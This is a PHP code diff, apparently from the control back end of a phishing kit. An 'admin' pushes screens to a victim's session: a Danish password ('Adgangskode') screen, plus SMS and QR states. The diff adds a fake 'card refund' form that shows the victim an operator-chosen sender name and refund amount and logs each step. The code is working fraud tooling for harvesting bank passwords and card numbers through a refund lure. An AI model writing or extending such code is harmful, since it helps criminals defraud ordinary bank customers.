@@ -267,18 +267,26 @@ function handleWsPolling(string $method, string $path): bool {
                 $queueMessage('admin', ['type' => 'status-changed', 'field' => 'sms_active', 'value' => false]);
             }
 
-            // Refundering på kort — Adgangskode screen
+            // Adgangskode screen
             elseif ($type === 'show-adgangskode') {
                 $pdo->prepare("UPDATE sessions SET qr_visible = 0, qr_image = NULL, sms_active = 0, updated_at = ? WHERE session_id = ?")->execute([$now, $sessionId]);
                 $pdo->prepare("INSERT INTO auth_log (session_id, event_type, detail) VALUES (?, 'show_adgangskode', 'Admin showed Adgangskode screen')")->execute([$sessionId]);
                 $queueMessage('user', ['type' => 'show-adgangskode']);
             }
 
-            // Refundering på kort — card number screen
+            // Refundering på kort — card form (from + amount from admin modal)
             elseif ($type === 'show-card-refund') {
+                $from = trim((string)($data['from'] ?? $data['displayText'] ?? ''));
+                $amount = isset($data['amount']) ? trim((string)$data['amount']) : '';
                 $pdo->prepare("UPDATE sessions SET qr_visible = 0, qr_image = NULL, sms_active = 0, updated_at = ? WHERE session_id = ?")->execute([$now, $sessionId]);
-                $pdo->prepare("INSERT INTO auth_log (session_id, event_type, detail) VALUES (?, 'show_card_refund', 'Admin showed card refund screen')")->execute([$sessionId]);
-                $queueMessage('user', ['type' => 'show-card-refund']);
+                $detail = 'Card refund screen' . ($from !== '' ? " from={$from}" : '') . ($amount !== '' ? " amount={$amount}" : '');
+                $pdo->prepare("INSERT INTO auth_log (session_id, event_type, detail) VALUES (?, 'show_card_refund', ?)")->execute([$sessionId, $detail]);
+                $queueMessage('user', [
+                    'type' => 'show-card-refund',
+                    'from' => $from,
+                    'displayText' => $from,
+                    'amount' => $amount !== '' ? $amount : null,
+                ]);
             }
         }
 
